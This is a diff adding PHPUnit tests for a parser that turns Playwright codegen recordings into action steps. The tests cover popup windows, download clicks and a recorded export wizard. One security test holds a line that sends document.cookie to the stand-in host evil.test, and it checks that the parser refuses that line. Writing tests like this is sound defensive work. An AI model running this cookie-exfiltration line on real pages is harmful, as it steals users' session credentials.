@@ -85,6 +85,121 @@ class CodegenParserTest extends TestCase
     }
 
     /* ---------------------------------------------------------------- *
+     * Popup handoffs — SCDB's export wizard runs entirely in popups.
+     * ---------------------------------------------------------------- */
+
+    public function test_it_follows_a_popup_handoff(): void
+    {
+        $source = <<<'JS'
+        const page1Promise = page.waitForEvent('popup');
+        await page.getByRole('button', { name: 'Exports' }).click();
+        const page1 = await page1Promise;
+        await page1.getByRole('button', { name: 'SEARCH' }).click();
+        JS;
+
+        $result = $this->parser->parse($source);
+
+        $this->assertSame([], $result['unsupported']);
+        $this->assertCount(2, $result['actions']);
+
+        // The click that opens the window is flagged...
+        $this->assertTrue($result['actions'][0]['opensPopup']);
+        // ...and the statement addressing the popup is no longer rejected.
+        $this->assertSame('SEARCH', $result['actions'][1]['locator']['name']);
+    }
+
+    public function test_it_follows_two_chained_popups(): void
+    {
+        $source = <<<'JS'
+        const page1Promise = page.waitForEvent('popup');
+        await page.getByRole('button', { name: 'Exports' }).click();
+        const page1 = await page1Promise;
+        const page2Promise = page1.waitForEvent('popup');
+        await page1.getByRole('grid').filter({ hasText: 'COMP_RPT_Redline markup' }).click();
+        const page2 = await page2Promise;
+        await page2.getByRole('button', { name: ' Next' }).click();
+        JS;
+
+        $result = $this->parser->parse($source);
+
+        $this->assertSame([], $result['unsupported']);
+        $this->assertCount(3, $result['actions']);
+        $this->assertTrue($result['actions'][0]['opensPopup']);
+        $this->assertTrue($result['actions'][1]['opensPopup']);
+        $this->assertSame('COMP_RPT_Redline markup', $result['actions'][1]['locator']['hasText']);
+        $this->assertArrayNotHasKey('opensPopup', $result['actions'][2]);
+    }
+
+    /**
+     * Codegen records the export click and a download listener around it.
+     * Recognising that pair means the user does not have to remember to flag
+     * the step by hand — and a recipe without the flag downloads nothing.
+     */
+    public function test_a_click_inside_a_download_sandwich_becomes_a_download_step(): void
+    {
+        $source = <<<'JS'
+        const downloadPromise = page.waitForEvent('download');
+        await page.getByRole('button', { name: ' Finish' }).click();
+        const download = await downloadPromise;
+        JS;
+
+        $result = $this->parser->parse($source);
+
+        $this->assertCount(1, $result['actions']);
+        $this->assertSame('download', $result['actions'][0]['type']);
+        $this->assertSame(' Finish', $result['actions'][0]['locator']['name']);
+    }
+
+    /** The real SCDB export recording, end to end. */
+    public function test_it_converts_the_scdb_export_wizard_recording(): void
+    {
+        $source = <<<'JS'
+        import { test, expect } from '@playwright/test';
+
+        test.use({ storageState: 'scdb-auth.json' });
+
+        test('test', async ({ page }) => {
+          await page.goto('https://chiyodanfe.ceccms.com/login.aspx');
+          await page.goto('https://chiyodanfe.ceccms.com/ISC/Tools/vDashboardsUsers/Switchboard.htm');
+          const page1Promise = page.waitForEvent('popup');
+          await page.getByRole('button', { name: 'Exports' }).click();
+          const page1 = await page1Promise;
+          await page1.getByRole('button', { name: 'icon' }).click();
+          await page1.getByText('By_Thariq').click();
+          await page1.getByRole('textbox', { name: 'Saved Export Name' }).click();
+          await page1.getByRole('textbox', { name: 'Saved Export Name' }).press('Shift+Home');
+          await page1.getByRole('textbox', { name: 'Saved Export Name' }).fill('Mark');
+          await page1.getByRole('button', { name: 'SEARCH' }).click();
+          const page2Promise = page1.waitForEvent('popup');
+          await page1.getByRole('grid').filter({ hasText: 'COMP_RPT_Redline markup' }).click();
+          const page2 = await page2Promise;
+          await page2.getByRole('button', { name: ' Next' }).click();
+          await page2.getByRole('button', { name: ' Next' }).click();
+          const downloadPromise = page2.waitForEvent('download');
+          await page2.getByRole('button', { name: ' Finish' }).click();
+          const download = await downloadPromise;
+          await page2.getByRole('button', { name: ' Exit' }).click();
+        });
+        JS;
+
+        $result = $this->parser->parse($source);
+
+        $this->assertSame([], $result['unsupported'], 'the whole recording should convert');
+
+        $types = array_column($result['actions'], 'type');
+        $this->assertSame([
+            'goto', 'goto', 'click', 'click', 'click',
+            'click', 'press', 'fill', 'click', 'click',
+            'click', 'click', 'download', 'click',
+        ], $types);
+
+        // The two window handoffs, and the download, are all identified.
+        $this->assertTrue($result['actions'][2]['opensPopup']);
+        $this->assertTrue($result['actions'][9]['opensPopup']);
+        $this->assertSame('download', $result['actions'][12]['type']);
+    }
+
+    /* ---------------------------------------------------------------- *
      * Security: the parser must refuse, never interpret.
      * ---------------------------------------------------------------- */
 
@@ -111,6 +226,22 @@ class CodegenParserTest extends TestCase
             $this->assertSame([], $result['actions'], "Should not convert: {$statement}");
             $this->assertCount(1, $result['unsupported'], "Should flag: {$statement}");
         }
+    }
+
+    public function test_a_popup_handle_is_not_a_way_around_the_scripting_ban(): void
+    {
+        $source = <<<'JS'
+        const page1Promise = page.waitForEvent('popup');
+        await page.getByRole('button', { name: 'Exports' }).click();
+        const page1 = await page1Promise;
+        await page1.evaluate(() => fetch('https://evil.test/?c=' + document.cookie));
+        JS;
+
+        $result = $this->parser->parse($source);
+
+        $this->assertCount(1, $result['actions']);
+        $this->assertCount(1, $result['unsupported']);
+        $this->assertStringContainsString('may not run JavaScript', $result['unsupported'][0]['reason']);
     }
 
     public function test_it_refuses_a_goto_outside_the_allowlist(): void
